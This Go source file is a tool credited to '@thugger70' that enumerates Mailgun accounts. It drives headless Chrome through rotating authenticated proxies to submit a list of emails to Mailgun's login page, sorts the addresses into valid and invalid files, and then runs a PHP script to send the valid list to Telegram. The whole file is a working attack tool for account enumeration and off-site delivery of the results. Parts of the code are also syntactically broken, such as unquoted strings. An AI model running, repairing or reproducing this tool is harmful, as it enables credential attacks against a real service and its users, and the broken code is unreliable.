package main

import (
	"bufio"
	"context"
	"fmt"
	"github.com/chromedp/chromedp"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ANSI color codes for terminal output
const (
	Red    = "\033[31m"
	Green  = "\033[32m"
	Yellow = "\033[33m"
	Blue   = "\033[34m"
	Reset  = "\033[0m"
)

var mu sync.Mutex // Mutex for thread-safe operations

func main() {
	setupSignalHandler() // Handle Ctrl+C gracefully
	displayBanner()

	// Open or create the log file
	logFile, err := os.OpenFile("log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Failed to create log file: %v\n", err)
		return
	}
	defer logFile.Close()
	log.SetOutput(logFile) // Log output to file

	fmt.Println(Yellow + "Press Enter to start..." + Reset)
	fmt.Scanln() // Wait for user input

	// Load emails and proxies from files
	emails, err := readLinesFromFile("email.txt")
	if err != nil || len(emails) == 0 {
		log.Fatalf("Failed to read emails or the file is empty: %v\n", err)
	}
	proxies, err := readLinesFromFile("proxies.txt")
	if err != nil || len(proxies) == 0 {
		log.Fatalf("Failed to read proxies or the file is empty: %v\n", err)
	}

	workerCount := getWorkerCount()
	var wg sync.WaitGroup
	emailChan := make(chan string)

	// Start proxy workers
	for i := 0; i < workerCount && i < len(proxies); i++ {
		wg.Add(1)
		go proxyWorker(proxies[i], emailChan, &wg)
	}

	// Send emails to workers in batches
	processEmailsInBatches(emails, emailChan)
	close(emailChan) // Close channel after sending all emails

	wg.Wait() // Wait for all workers to finish
	sendFileToTelegram() // Send results to Telegram
}

// Setup signal handling for graceful shutdown
func setupSignalHandler() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)
	go func() {
		<-c
		log.Println(Red + "Interrupt signal received. Exiting gracefully..." + Reset)
		os.Exit(0)
	}()
}

// Process emails in smaller batches
func processEmailsInBatches(emails []string, emailChan chan<- string) {
	const batchSize = 100
	for i := 0; i < len(emails); i += batchSize {
		end := i + batchSize
		if end > len(emails) {
			end = len(emails)
		}
		for _, email := range emails[i:end] {
			emailChan <- email
		}
	}
}

// Get the number of workers from user input (Max 20)
func getWorkerCount() int {
	var count int
	for {
		fmt.Print(Blue + "Enter the number of workers (Maximum 20): " + Reset)
		input := bufio.NewScanner(os.Stdin)
		input.Scan()
		entered := input.Text()

		n, err := strconv.Atoi(entered)
		if err != nil || n < 1 || n > 20 {
			fmt.Println(Red + "Invalid input. Please enter a number between 1 and 20." + Reset)
		} else {
			count = n
			break
		}
	}
	return count
}

// Display the ASCII banner at startup
func displayBanner() {
	banner := 
███████╗████████╗██╗   ██╗██████╗  ██████╗ 
██╔════╝╚══██╔══╝██║   ██║██╔══██╗██╔════╝ 
███████╗   ██║   ██║   ██║██████╔╝██║  ███╗
╚════██║   ██║   ██║   ██║██╔══██╗██║   ██║
███████║   ██║   ╚██████╔╝██████╔╝╚██████╔╝
╚══════╝   ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ 
   MAILGUN sorter by @thugger70

	fmt.Println(Green + banner + Reset)
}

// Worker function to handle email checking with a proxy
func proxyWorker(proxy string, emailChan <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	semaphore := make(chan struct{}, 5) // Limit to 5 workers

	for email := range emailChan {
		semaphore <- struct{}{} // Acquire token
		defer func() { <-semaphore }() // Release token

		err := retryCheck(proxy, email) // Retry logic
		if err != nil {
			log.Printf(Red+"Error with proxy %s for email %s: %v\n"+Reset, proxy, email, err)
		}
	}
}

// Retry logic for email checking
func retryCheck(proxy, email string) error {
	const maxRetries = 3
	var err error

	for i := 0; i < maxRetries; i++ {
		err = checkEmailWithProxy(proxy, email)
		if err == nil {
			return nil
		}
		log.Printf(Yellow+"Retrying (%d/%d) for %s\n"+Reset, i+1, maxRetries, email)
		time.Sleep(2 * time.Second) // Backoff
	}
	return err
}

// Check the validity of an email using a proxy
func checkEmailWithProxy(proxy, email string) error {
	proxyURL, ip, err := parseProxy(proxy)
	if err != nil {
		return fmt.Errorf("invalid proxy format: %v", err)
	}

	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", true),
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("no-sandbox", true),
		chromedp.Flag("disable-logging", true),
		chromedp.Flag("proxy-server", proxyURL),
	)

	ctx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancel()

	ctx, cancel = chromedp.NewContext(ctx)
	defer cancel()

	ctx, cancel = context.WithTimeout(ctx, 120*time.Second)
	defer cancel()

	emailSelector := #username
	nextButtonSelector := #next
	errorMessageSelector := span.loginForm__statusText

	err = chromedp.Run(ctx,
		chromedp.Navigate("https://login.mailgun.com/login"),
		chromedp.WaitVisible(emailSelector, chromedp.ByID),
		chromedp.SendKeys(emailSelector, email, chromedp.ByID),
		chromedp.Click(nextButtonSelector, chromedp.ByID),
		chromedp.Sleep(3*time.Second),
	)
	if err != nil {
		return fmt.Errorf("navigation failed: %v", err)
	}

	var response string
	err = chromedp.Run(ctx,
		chromedp.Text(errorMessageSelector, &response, chromedp.NodeVisible),
	)
	if err != nil {
		response = ""
	}

	if response == "" {
		displayStatus("MAILGUN USER", "VALID", email, ip, Green)
		saveResult("valid.txt", email)
	} else {
		displayStatus("MAILGUN USER", "INVALID", email, ip, Red)
		saveResult("invalid.txt", email)
	}

	return nil
}

// Parse a proxy string into its components
func parseProxy(proxy string) (string, string, error) {
	parts := strings.Split(proxy, ":")
	if len(parts) < 4 {
		return "", "", fmt.Errorf("proxy format is incorrect")
	}

	ip := parts[0]
	port := parts[1]
	username := parts[2]
	password := parts[3]

	proxyURL := fmt.Sprintf("http://%s:%s@%s:%s", username, password, ip, port)
	return proxyURL, ip, nil
}

// Display the status of the email check
func displayStatus(userType, status, email, ip, color string) {
	border := strings.Repeat("─", 50)
	statusLine := fmt.Sprintf("%s│ %-10s │ %-30s │ %s%s", color, status, email, ip, Reset)

	fmt.Printf("┏%s┓\n", border)
	fmt.Printf("┃ %-10s │ %-30s │ %s ┃\n", userType, "", ip)
	fmt.Printf("┣%s┫\n", border)
	fmt.Printf("┃ %s ┃\n", statusLine)
	fmt.Printf("┗%s┛\n", border)
}

// Save the result to a file
func saveResult(filename, email string) {
	mu.Lock()
	defer mu.Unlock()

	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf(Red+"Failed to open %s: %v\n"+Reset, filename, err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(email + "\n"); err != nil {
		log.Printf(Red+"Failed to write to %s: %v\n"+Reset, filename, err)
	}
}

// Send the valid.txt file to Telegram using a PHP script
func sendFileToTelegram() {
	cmd := exec.Command("php", "cid.php")
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatalf(Red+"Failed to send file to Telegram: %v\n"+Reset, err)
	}
	log.Printf(Yellow+"Telegram Response: %s\n"+Reset, string(output))
}

// Read lines from a file
func readLinesFromFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}